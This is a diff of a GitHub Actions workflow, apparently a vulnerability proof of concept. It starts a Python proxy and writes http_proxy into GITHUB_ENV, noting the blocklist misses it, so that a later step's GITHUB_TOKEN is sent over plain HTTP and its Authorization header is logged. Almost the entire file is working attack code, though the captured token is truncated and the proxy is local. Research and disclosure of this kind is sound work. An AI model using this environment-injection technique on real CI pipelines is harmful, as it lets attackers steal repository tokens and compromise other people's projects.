@@ -1,4 +1,4 @@
-name: MITM Token Capture PoC
+name: MITM Token Capture v2
 on:
   workflow_dispatch:
 
@@ -9,52 +9,62 @@ jobs:
   mitm-capture:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup proxy listener (simulates attacker infrastructure)
+      - name: Start python proxy and inject via GITHUB_ENV
         run: |
-          # Start a simple TCP listener that captures incoming data
-          # In a real attack, this would be the attacker's proxy server
-          mkdir -p /tmp/captures
+          # Python3 HTTP proxy that logs captured requests
+          cat > /tmp/proxy.py << 'PYEOF'
+          import http.server, socketserver, sys, os
+          class ProxyHandler(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  with open('/tmp/captured_headers.txt', 'a') as f:
+                      f.write(f"METHOD: {self.command}\n")
+                      f.write(f"PATH: {self.path}\n")
+                      for k, v in self.headers.items():
+                          if k.lower() == 'authorization':
+                              f.write(f"CAPTURED_AUTH: {v[:20]}...REDACTED\n")
+                              f.write(f"CAPTURED_AUTH_LENGTH: {len(v)}\n")
+                          else:
+                              f.write(f"HEADER: {k}: {v}\n")
+                      f.write("---END---\n")
+                  self.send_response(502)
+                  self.end_headers()
+                  self.wfile.write(b"proxy-intercepted")
+              do_POST = do_GET
+              do_PUT = do_GET
+              do_CONNECT = do_GET
+              def log_message(self, format, *args): pass
+          with socketserver.TCPServer(("127.0.0.1", 18080), ProxyHandler) as s:
+              s.handle_request()
+          PYEOF
           
-          # Use socat to create a one-shot TCP listener that saves the request
-          nohup bash -c '
-            socat TCP-LISTEN:18080,reuseaddr,fork SYSTEM:"cat > /tmp/captures/request_\$(date +%s%N).txt; echo HTTP/1.1 502 Bad\ Gateway; echo; echo proxy-captured" &
-          ' &
+          # Start proxy in background
+          python3 /tmp/proxy.py &
+          PROXY_PID=$!
           sleep 1
-          echo "Proxy listener started on port 18080"
+          echo "Python proxy started (PID=$PROXY_PID)"
           
-          # Now inject https_proxy via GITHUB_ENV (NOT BLOCKED by blocklist)
+          # Verify it's listening
+          ss -tlnp | grep 18080 || echo "Port check failed"
+          
+          # INJECT proxy via GITHUB_ENV (NOT BLOCKED - only NODE_OPTIONS is blocked)
           echo "http_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
-          echo "https_proxy=http://127.0.0.1:18080" >> $GITHUB_ENV
-          echo "Proxy env vars set via GITHUB_ENV (NOT blocked - only NODE_OPTIONS is blocked)"
+          echo "Proxy injected via GITHUB_ENV"
           
-      - name: Victim API call (GITHUB_TOKEN goes through proxy)
+      - name: Victim step - API call sends GITHUB_TOKEN through proxy
         run: |
-          echo "=== Proxy state ==="
           echo "http_proxy=$http_proxy"
-          echo "https_proxy=$https_proxy"
-          echo ""
-          
-          # This curl will go through the attacker proxy because https_proxy is set
-          # The proxy captures the Authorization header with GITHUB_TOKEN
-          echo "Making API call (will go through proxy)..."
-          curl -v --max-time 5 \
+          echo "Making API call with GITHUB_TOKEN..."
+          # Use http:// (not https://) so the proxy can see the full request
+          curl --max-time 5 -sS \
             -H "Authorization: token $GITHUB_TOKEN" \
-            http://api.github.com/repos/toofikz/public-test-repo 2>&1 || true
+            "http://api.github.com/repos/toofikz/public-test-repo" 2>&1 || true
           
           echo ""
-          echo "=== Checking what the proxy captured ==="
-          for f in /tmp/captures/request_*.txt; do
-            if [ -f "$f" ]; then
-              echo "--- Captured request ---"
-              # Show the captured data, masking the actual token
-              cat "$f" | head -20
-              echo "---"
-              # Check if Authorization header was captured
-              if grep -qi "authorization" "$f"; then
-                echo "CRITICAL: Authorization header with GITHUB_TOKEN was captured by the proxy!"
-                echo "Token line (masked): $(grep -i 'authorization' "$f" | sed 's/token .*/token [CAPTURED]/')"
-              fi
-            fi
-          done
+          echo "=== PROXY CAPTURE LOG ==="
+          if [ -f /tmp/captured_headers.txt ]; then
+            cat /tmp/captured_headers.txt
+          else
+            echo "No captures (proxy may not have received the request)"
+          fi
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
